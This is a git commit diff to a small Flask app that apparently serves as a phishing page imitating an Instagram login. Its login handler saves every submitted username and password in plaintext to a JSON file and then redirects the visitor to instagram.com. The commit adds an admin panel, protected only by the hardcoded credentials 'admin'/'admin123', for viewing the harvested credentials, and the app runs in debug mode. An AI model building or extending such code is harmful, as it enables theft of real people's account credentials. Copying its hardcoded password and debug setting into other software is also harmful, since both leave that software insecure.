207219d46c4193acf4b33f75cb40f92a2340f97f
yusufaksungur <yusufaksungur34@gmail.com>
2025-01-17 10:01:12 +0300

    Panale login ekranı ve Logout button eklendi

--- app.py
+++ app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, flash, url_for
+from flask import Flask, render_template, request, redirect, flash, url_for, session
 import json
 import os
 
@@ -29,12 +29,10 @@ def login_post():
     username = request.form['username']
     password = request.form['password']
 
-    # Kullanıcı adı ve şifre kontrolü
-    if username and password:  # Burada daha güvenli bir doğrulama yapılabilir
-        # Kullanıcıyı JSON dosyasına kaydet
-        users_data = load_users()  # mevcut kullanıcıları yükle
-        users_data.append({'username': username, 'password': password})  # yeni kullanıcıyı ekle
-        save_user_data(users_data)  # dosyaya kaydet
+    if username and password:
+        users_data = load_users()
+        users_data.append({'username': username, 'password': password})
+        save_user_data(users_data)
 
         flash('Login successful!', 'success')
         return redirect("https://www.instagram.com/")
@@ -42,15 +40,40 @@ def login_post():
         flash('Invalid credentials, please try again.', 'danger')
         return redirect(url_for('login'))
 
+@app.route('/admin_login', methods=['GET', 'POST'])
+def admin_login():
+    if request.method == 'POST':
+        admin_username = request.form['admin_username']
+        admin_password = request.form['admin_password']
+
+        if admin_username == "admin" and admin_password == "admin123":
+            session['admin'] = True
+            flash('Admin login successful!', 'success')
+
+            # Admin giriş yaptıktan sonra yönlendirme
+            return redirect(url_for('show_users'))
+        else:
+            flash('Invalid admin credentials!', 'danger')
+            return redirect(url_for('admin_login'))
+
+    return render_template('admin_login.html')
+
 @app.route('/show_users')
 def show_users():
-    # JSON dosyasından kullanıcıları alıyoruz
-    users_data = load_users()
+    # Admin oturumu kontrolü
+    if 'admin' not in session:
+        flash('You must log in as admin to view this page.', 'warning')
+        return redirect(url_for('admin_login'))
 
-    # Kullanıcıları JSON formatında döndürüyoruz
+    users_data = load_users()
     return render_template('show_users.html', users=users_data)
+
+@app.route('/admin_logout', methods=['POST'])
+def admin_logout():
+    session.pop('admin', None)
+    flash('You have been logged out successfully.', 'info')
+    return redirect('https://www.google.com')
+
 
 if __name__ == "__main__":
     app.run(debug=True)
-
-
